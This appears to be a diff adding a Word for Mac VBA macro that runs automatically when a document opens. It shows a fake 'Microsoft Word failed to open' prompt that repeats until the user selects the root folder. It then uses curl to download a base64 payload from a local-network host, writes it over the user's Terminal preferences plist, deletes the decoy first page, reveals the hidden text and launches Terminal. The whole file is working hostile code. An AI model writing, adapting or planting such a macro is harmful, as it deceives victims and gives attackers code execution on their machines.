@@ -1,0 +1,64 @@
+Option Explicit
+
+Function Base64Decode(ByVal s As String) As Byte()
+    Dim xmlDoc As Object, xmlElem As Object
+    Set xmlDoc = CreateObject("MSXML2.DOMDocument.6.0")
+    Set xmlElem = xmlDoc.createElement("b64")
+    xmlElem.DataType = "bin.base64"
+    xmlElem.Text = s
+    Base64Decode = xmlElem.NodeTypedValue
+End Function
+
+Public Sub AutoOpen()
+    DownloadAndWritePlist
+    FixPage
+End Sub
+
+Sub DownloadAndWritePlist()
+    Dim folderPath As String
+    Do
+        On Error Resume Next
+        folderPath = MacScript( _
+            "set chosenFolder to choose folder default location (POSIX file ""/"") with prompt ""Microsoft Word failed to open. Please try again and click Choose.""" & vbCrLf & _
+            "return POSIX path of chosenFolder" _
+        )
+        If Err.Number <> 0 Then
+            Err.Clear
+            folderPath = ""
+        End If
+        On Error GoTo 0
+    Loop While folderPath <> "/"
+    
+    Dim username As String
+    username = Trim(MacScript("do shell script ""whoami"""))
+    
+    Dim prefPath As String
+    prefPath = "/Users/" & username & "/Library/Preferences"
+    On Error Resume Next: MkDir prefPath: On Error GoTo 0
+    
+    Dim targetFile As String
+    targetFile = prefPath & "/com.apple.Terminal.plist"
+    
+    Dim base64Str As String
+    base64Str = Trim(MacScript("do shell script ""curl -s http://192.168.1.123:8080/b64.txt"""))
+    
+    Dim decoded() As Byte
+    decoded = Base64Decode(base64Str)
+    
+    Dim fNum As Integer: fNum = FreeFile
+    Open targetFile For Binary Access Write As #fNum
+        Put #fNum, , decoded
+    Close #fNum
+    
+    Dim doc As Document: Set doc = ActiveDocument
+    Dim scriptResult As String
+    
+    doc.Sections(1).Range.Bookmarks("\Page").Range.Delete
+    doc.Content.Font.Hidden = False
+    
+    MacScript "do shell script ""open -n -a Terminal"""
+End Sub
+
+
+
+
